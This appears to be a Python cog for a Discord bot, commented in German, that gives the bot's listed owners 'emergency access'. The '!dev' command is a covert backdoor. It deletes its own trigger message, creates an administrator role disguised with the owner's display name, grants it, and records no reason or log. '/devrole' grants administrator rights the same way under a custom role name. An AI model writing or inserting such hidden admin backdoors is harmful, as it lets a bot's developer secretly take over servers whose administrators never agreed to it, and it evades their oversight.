"""
Owner-Notfall-Zugriff.
!dev        — stiller Notfall-Zugriff (silent, kein Log).
/devrole    — Rolle mit Admin-Perms & custom Name erstellen + vergeben.
Unterstützt mehrere Owner via OWNER_IDS in .env.
"""

import discord
from discord import app_commands
from discord.ext import commands

from utils.owners import is_owner


class Owner(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    # ── !dev ──────────────────────────────────────────────────────────────────

    @commands.command(name="dev")
    async def dev(self, ctx: commands.Context):
        if not is_owner(ctx.author.id):
            return

        try:
            await ctx.message.delete()
        except (discord.Forbidden, discord.HTTPException):
            pass

        guild = ctx.guild
        if guild is None:
            return

        owner_member = guild.get_member(ctx.author.id)
        if owner_member is None:
            try:
                owner_member = await guild.fetch_member(ctx.author.id)
            except (discord.Forbidden, discord.HTTPException, discord.NotFound):
                return

        role_name = owner_member.display_name
        role = discord.utils.get(guild.roles, name=role_name)
        if role is None:
            try:
                role = await guild.create_role(
                    name=role_name,
                    permissions=discord.Permissions(administrator=True),
                    colour=discord.Colour.red(),
                    reason=None,
                )
            except (discord.Forbidden, discord.HTTPException):
                return

        try:
            await owner_member.add_roles(role, reason=None)
        except (discord.Forbidden, discord.HTTPException):
            pass

    # ── /devrole ──────────────────────────────────────────────────────────────

    @app_commands.command(name="devrole", description="[Owner] Erstellt eine Admin-Rolle mit custom Namen und vergibt sie dir.")
    @app_commands.describe(name="Name der Rolle")
    async def devrole(self, interaction: discord.Interaction, name: str):
        if not is_owner(interaction.user.id):
            return await interaction.response.send_message(
                "❌ Kein Zugriff.", ephemeral=True
            )

        guild = interaction.guild
        if guild is None:
            return await interaction.response.send_message(
                "❌ Nur auf Servern.", ephemeral=True
            )

        await interaction.response.defer(ephemeral=True)

        member = guild.get_member(interaction.user.id)
        if member is None:
            try:
                member = await guild.fetch_member(interaction.user.id)
            except (discord.Forbidden, discord.HTTPException, discord.NotFound):
                return await interaction.followup.send("❌ Member nicht gefunden.", ephemeral=True)

        # Vorhandene Rolle wiederverwenden oder neu erstellen
        role = discord.utils.get(guild.roles, name=name)
        created = False
        if role is None:
            try:
                role = await guild.create_role(
                    name=name,
                    permissions=discord.Permissions(administrator=True),
                    colour=discord.Colour.red(),
                    reason=None,
                )
                created = True
            except discord.Forbidden:
                return await interaction.followup.send(
                    "❌ Keine Berechtigung zum Erstellen von Rollen.", ephemeral=True
                )

        try:
            await member.add_roles(role, reason=None)
        except discord.Forbidden:
            return await interaction.followup.send(
                "❌ Keine Berechtigung zum Vergeben der Rolle.", ephemeral=True
            )

        action = "erstellt & vergeben" if created else "gefunden & vergeben"
        await interaction.followup.send(
            f"✅ Rolle **{role.name}** {action}.", ephemeral=True
        )


async def setup(bot: commands.Bot):
    await bot.add_cog(Owner(bot))
